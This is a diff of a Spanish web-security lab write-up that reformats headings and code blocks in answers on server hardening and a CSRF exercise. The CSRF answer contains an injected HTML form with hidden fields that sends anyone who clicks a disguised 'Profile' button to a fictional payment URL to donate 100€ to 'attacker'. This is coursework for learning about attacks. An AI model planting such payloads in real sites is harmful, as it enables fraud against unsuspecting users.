@@ -361,7 +361,7 @@ if (!$username || strlen($username) < 3 || strlen($username) > 20) {
 }
 ```
 
-1. ### **4. Servidores web**
+### **4. Servidores web**
    ¿Qué medidas de seguridad se implementaríais en el servidor web para reducir el riesgo a ataques?
 
    Para que podamos reducir el riesgo a ataques en nuestro servidor web, podríamos implementar algunas medidas de seguridad, como por ejemplo:
@@ -372,31 +372,32 @@ if (!$username || strlen($username) < 3 || strlen($username) > 20) {
 
    En conjunto, tendríamos que realizar auditorias regulares de los servicios y archivos e implementar un sistema de copias de seguridad automático y periódico, comprobando también periódicamente que se estén realizando correctamente.
 
-1. ### **5. CSRF**
+### **5. CSRF**
    Ahora ya sabemos que podemos realizar un ataque XSS. Hemos preparado el siguiente enlace: http://web.pagos/donate.php?amount=100&receiver=attacker, mediante el cual, cualquiera que haga click hará una donación de 100€ al nuestro usuario (con nombre 'attacker') de la famosa plataforma de pagos online 'web.pagos' (Nota: como en realidad esta es una dirección inventada, vuestro navegador os devolverá un error 404).
 
    a) Editad un jugador para conseguir que, en el listado de jugadores list\\_players.php aparezca, debajo del nombre de su equipo y antes de show/add comments un botón llamado Profile que corresponda a un formulario que envíe a cualquiera que haga clic sobre este botón a esta dirección que hemos preparado.
 
 | En el campo... | 
 | --------------- | 
-| ```
-<div>
-    <a href="show_comments.php?id=".$row['playerid'].">(show/add comments)</a>
-    <a href="insert_player.php?id=".$row['playerid'].">(edit player)</a>
-</div>
-</li>
-}
+| ```html  
+<div>  
+    <a href="show_comments.php?id=".$row['playerid'].">(show/add comments)</a>  
+    <a href="insert_player.php?id=".$row['playerid'].">(edit player)</a>  
+</div>  
+</li>  
+}  
 ``` |
 
 | Introduzco... |
 | --------------- |
-| ```
-<form action='http://web.pagos/donate.php' method='get' style='display:inline;'>
-    <input type='hidden' name='amount' value='100'>
-    <input type='hidden' name='receiver' value='attacker'>
-    <input type='submit' value='Profile' style='cursor:pointer;'>
-</form>
+| ```html  
+<form action='http://web.pagos/donate.php' method='get' style='display:inline;'>  
+    <input type='hidden' name='amount' value='100'>  
+    <input type='hidden' name='receiver' value='attacker'>  
+    <input type='submit' value='Profile' style='cursor:pointer;'>  
+</form>  
 ``` |
+
 
    **b)** Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentaría si no necesitara que el usuario pulse un botón. Con este objetivo, cread un comentario que sirva vuestros propósitos sin levantar ninguna sospecha entre los usuarios que consulten los comentarios sobre un jugador (show\_comments.php).
 
